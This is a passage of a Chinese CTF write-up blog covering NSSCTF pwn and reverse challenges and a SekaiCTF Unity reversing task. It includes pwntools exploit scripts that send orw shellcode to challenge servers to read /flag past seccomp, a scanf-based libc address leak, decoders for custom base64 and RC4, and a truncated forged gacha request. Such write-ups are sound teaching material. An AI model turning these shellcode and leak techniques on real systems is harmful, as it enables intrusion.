class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 28397)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#random.seed(0)</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line">sd = <span class="number">0</span></span><br><span class="line"><span class="comment"># payload提前放在这里是因为编译要时间，放在后门可能会alarm clock(问就是被迫多跑了一遍，远程真TM慢)</span></span><br><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))<span class="comment"># 建议写绝对地址，理由看上面openat那里</span></span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 发现每次连接迷宫都不一样，所以不能用本地跑出来的路线来跑，要重新探路</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">28821</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;That&#x27;s all\n&quot;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">150</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">        log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">150</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * <span class="built_in">len</span>(step_arr)):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">res = io.recvuntil(<span class="string">b&quot;don&#x27;t forget your flag\n&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-happy2"><a href="#Pwn-happy2" class="headerlink" title="Pwn-happy2"></a>Pwn-happy2</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/happy2" target="_block">happy2</a></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_proof.png" alt="happy2_proof" style="zoom:80%;"><p>要绕过最后的一个判断，显然是要通过前面的printf泄露puts的地址</p><p>可以利用scanf在读取非数字字符时，不会返回值的特性，这里输入’+’号，就可以泄露栈中的数据了，动调发现第二个数据是stderr的地址，所以泄露stderr地址，再根据stderr和puts的偏移算出puts地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;konw\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">stderr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;you&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">exit_addr = stderr - <span class="number">0x1997d0</span><span class="comment"># 这里只算了本机的偏移，远程应该不同</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have a try\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(exit_addr).encode())</span><br></pre></td></tr></table></figure><p>然后main里的思路是orw</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_main.png" alt="happy2_main" style="zoom: 80%;"><p>用seccomp-tools dump一下，ban了execve，fork，connect，read（据说附件给错了，原本要ban的是readv），所以这里就用open，pread，write来拿到flag（思路和上一题差不多，不细讲了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.pread(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10400</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="Re-MyBase"><a href="#Re-MyBase" class="headerlink" title="Re-MyBase"></a>Re-MyBase</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/myBase.exe" target="_block">myBase.exe</a></p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>换表base64，发现每次base加密都利用随机数重新生成了一个新表，这里可以直接复刻代码逻辑用ctype来复原用过的表。</p><p>我这里是直接动调把表扒下来</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CLASSIC_TABLE = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">enc: <span class="built_in">str</span>|<span class="built_in">bytes</span>, key: <span class="built_in">str</span>|<span class="built_in">bytes</span> = CLASSIC_TABLE</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc, <span class="built_in">str</span>):</span><br><span class="line">        enc = enc.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">        key = key.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">65</span>:</span><br><span class="line">        padding = key[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(key) == <span class="number">64</span>:</span><br><span class="line">        padding = (<span class="built_in">set</span>(CLASSIC_TABLE) - <span class="built_in">set</span>(key)).pop()</span><br><span class="line">        key += <span class="built_in">bytes</span>([padding])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid key length&quot;</span>)</span><br><span class="line">    msg = []</span><br><span class="line">    l = <span class="built_in">len</span>(enc)</span><br><span class="line">    <span class="keyword">if</span> l % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid base64code length&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        buf = key.index(enc[i]) &lt;&lt; <span class="number">18</span> | key.index(enc[i+<span class="number">1</span>]) &lt;&lt; <span class="number">12</span> | key.index(enc[i+<span class="number">2</span>]) &lt;&lt; <span class="number">6</span> | key.index(enc[i+<span class="number">3</span>])</span><br><span class="line">        msg.append(buf &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        msg.append((buf &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">        msg.append(buf &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> enc[-<span class="number">1</span>] == padding:</span><br><span class="line">        msg.pop()</span><br><span class="line">        <span class="keyword">if</span> enc[-<span class="number">2</span>] == padding:</span><br><span class="line">            msg.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(msg)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;YkLYv1Xj23X7N0E5eoFgUveKeos1XS8K9r4g&#x27;</span></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">&#x27;+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK+SChbFanmklWEcgixXJIq6y5B/9z=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    <span class="comment"># 没有细看文件中的base64encode代码，在动调过程中发现加密生成的字符串顺序是反的，所以这里反过来再传参</span></span><br><span class="line">    flag += b64decode(enc[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>][::-<span class="number">1</span>], k)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># NSSCTF&#123;Welc0me_T0_Re_World&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Re-Bytecode"><a href="#Re-Bytecode" class="headerlink" title="Re-Bytecode"></a>Re-Bytecode</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/Bytecode.txt" target="_block">Bytecode.txt</a></p><p><em>字节码，直接手搓！！！</em></p><h3 id="复原代码："><a href="#复原代码：" class="headerlink" title="复原代码："></a>复原代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">key</span>):</span><br><span class="line">    x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="built_in">len</span>(x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong length!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(key[i]) ^ i != x[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">msg</span>):</span><br><span class="line">    key = <span class="string">&quot;Just kidding, don&#x27;t take it personally!&quot;</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        x[i] = (x[i] ^ i) &gt;&gt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t])</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, s_box, key</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[k]) ^ s_box[t] ^ <span class="built_in">ord</span>(key[i]))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;Please input your key:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(key) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;wrong!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&quot;Please input your msg:&quot;</span>)</span><br><span class="line">    box = init(key)</span><br><span class="line">    encode = encrypt(msg, box)</span><br><span class="line">    string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">    encode = b64encode(<span class="built_in">bytes</span>(encode)).decode().translate(<span class="built_in">str</span>.maketrans(string1, string2))</span><br><span class="line">    <span class="keyword">if</span> encode == <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congraduation!You get the right flag!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure><p>发现为了混淆写了几个没有用上的函数，这里<strong>只用到了check，init，enctypt这三个函数</strong></p><p>显然是一个RC4加密（变种，但是思路还是一样，加解密一样）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, msg</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t] ^ i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">string1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;YRiAOe4PlGvxaCoNj2ZgX+q8t/5Em6IUpM9FrVb7BKwsT1n3fSydhDWuQHJ0ckzL&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;mWGFL24R/RSZY3pzK9H4FOmFOnXJKyCjXWbZ7Ijy11GbCBukDrjsiPPFiYB=&#x27;</span></span><br><span class="line">enc = b64decode(enc.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    key.append(<span class="built_in">chr</span>(x[i] ^ i))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(key))</span><br><span class="line"></span><br><span class="line">flag = rc4(key, enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment"># NSSCTF&#123;eda20db6-3cff-6125-f6ca-1a155bd3292c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="SekaiCTF"><a href="#SekaiCTF" class="headerlink" title="SekaiCTF"></a>SekaiCTF</h1><p>只看了一道re，<del>打nss去了</del></p><ul><li><em>re-Asusawa’a Gacha World(finish)</em></li></ul><h2 id="Re-Asusawa’a-Gacha-World"><a href="#Re-Asusawa’a-Gacha-World" class="headerlink" title="Re-Asusawa’a Gacha World"></a>Re-Asusawa’a Gacha World</h2><p>u3d逆向，先找Assembly CSharp.dll用dotpeek打开</p><p>在character里面找到flag，查看引用发现4星卡会有flag</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_4star.png" alt="4star" style="zoom:80%;"><p>然后继续找引用，发现抽卡不在本地，每次抽卡是要发送post请求，</p><p>所以思路就是伪造抽卡请求，然后抽到4星卡，获得flag。</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sekai_re1_post.png"><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://172.86.64.89:3000/gacha&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span 